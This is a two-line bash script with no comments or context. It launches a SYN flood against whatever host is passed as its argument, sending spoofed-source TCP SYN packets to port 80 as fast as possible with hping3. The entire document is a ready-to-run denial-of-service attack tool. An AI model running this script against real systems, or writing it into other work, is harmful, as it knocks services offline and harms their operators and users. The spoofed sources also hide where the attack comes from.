#!/bin/bash
hping3 --flood --rand-source -S "$1" -p 80
